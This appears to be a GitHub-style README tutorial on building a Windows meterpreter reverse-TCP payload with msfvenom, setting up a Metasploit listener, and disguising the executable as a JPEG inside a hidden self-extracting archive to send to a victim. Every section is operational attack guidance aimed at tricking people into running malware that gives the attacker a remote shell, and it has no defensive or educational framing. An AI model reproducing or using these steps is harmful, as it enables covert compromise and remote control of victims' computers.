# hack_windows_by_image_jpeg

Metasploit has the ability to create an executable payload. This can be extremely useful if you can get a target machine to run the executable. Attackers often use social engineering, phishing, and other attacks to get a victim to run a payload. If attackers can get their a victim to run a payload, there is no reason for an attacker to find and exploit vulnerable software.

## Step 1:
you must create the payloud .For do that use this command in kali:
```
service postgresql start
msfvenom -p windows/meterpreter/reverse_tcp -f exe lhost=(your wan ip) lport=4444 R > test.exe
```
## Step 2:
we need Listening the port:
```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost (lan ip for find that type ifconfig in terminal)
set lport 4444
run
```

## We created the virus now we want to hide payload in image
you have to do this steps in windows
## Step 1:
convert your image to ico in this site ``` http://icoconvert.com/ ``` and save both files
so we have 3 files : jpg , virus , ico

## Step 2:
you must compress jpg file and test.exe(virus) and we need custom setting for this archive:
```
1. select comression method to best
2. select "Create sfx Archive" from Archive options
3. Click on Advanced tab and select on SFX options
4. Go to Statup tab 
5. type name of virus file(test.exe) and your jpg file in "run after extractions"
6. Go to modes tab and click on hide all
7. Go to Text and Icon tab and select your icon(we created in Step 1) in Load sfx icon from file
After select ok to Compress Archive
```
you can send your image to victim and you see open the session in your kali linux.

## Good luck (Mohammad Amin Ghaemi)
